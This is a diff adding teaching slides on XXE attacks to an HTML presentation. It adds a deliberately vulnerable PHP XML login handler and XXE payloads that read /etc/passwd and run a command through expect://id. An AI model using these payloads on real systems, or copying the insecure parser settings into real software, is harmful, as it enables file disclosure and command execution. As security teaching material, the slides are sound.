@@ -222,6 +222,30 @@
 					</h5>
 				</section>
 				<section>
+					<pre class="php"><code data-trim data-noescape>
+					&lt;?php
+					  libxml_disable_entity_loader (false);
+					  $xmlfile = file_get_contents('php://input');
+					  $dom = new DOMDocument();
+					  $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+					  $creds = simplexml_import_dom($dom);
+					  $user = $creds->user;
+					  $pass = $creds->pass;
+					  // ...
+					  if (...) { echo "You have logged in as user $user"; }
+					  else {
+						echo "error";
+					  }
+					?&gt;
+				  	</code></pre>
+					<pre class="xml"><code data-trim data-noescape>
+					&lt;creds&gt;
+					  &lt;user&gt;user&lt;/user&gt;
+					  &lt;pass&gt;pass&lt;/pass&gt;
+					&lt;/creds&gt;
+				  	</code></pre>
+				</section>
+				<section>
 					<h2>XXE (XML external entity)</h2>
 				</section>
 				<section>
@@ -229,6 +253,53 @@
 				</section>
 				<section>
 					<img src="./assets/xxe_scheme.png" alt="xxe scheme" width="600px">
+				</section>
+				<section>
+					<pre class="php"><code data-trim data-noescape>
+					&lt;?php
+					  libxml_disable_entity_loader (false);
+					  $xmlfile = file_get_contents('php://input');
+					  $dom = new DOMDocument();
+					  $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+					  $creds = simplexml_import_dom($dom);
+					  $user = $creds->user;
+					  $pass = $creds->pass;
+					  // ...
+					?&gt;
+				  	</code></pre>
+					<pre class="xml"><code data-trim data-noescape>
+					&lt;source lang="xml"&gt;
+					&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+					&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
+					&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;
+					&lt;creds&gt;
+					  &lt;user&gt;&amp;xxe;&lt;/user&gt;
+					  &lt;pass&gt;pass&lt;/pass&gt;
+					&lt;/creds&gt;
+				  	</code></pre>
+				</section>
+				<section>
+					<pre class="php"><code data-trim data-noescape>
+					&lt;?php
+					  libxml_disable_entity_loader (false);
+					  $xmlfile = file_get_contents('php://input');
+					  $dom = new DOMDocument();
+					  $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+					  $creds = simplexml_import_dom($dom);
+					  $user = $creds->user;
+					  $pass = $creds->pass;
+					  // ...
+					?&gt;
+				  	</code></pre>
+					<pre class="xml"><code data-trim data-noescape>
+					&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+					&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
+					&lt;!ENTITY xxe SYSTEM "expect://id" &gt;]&gt;
+					&lt;creds&gt;
+					  &lt;user&gt;&amp;xxe;&lt;/user&gt;
+					  &lt;pass&gt;pass&lt;/pass&gt;
+					&lt;/creds&gt;
+				  	</code></pre>
 				</section>
 
 			</div>
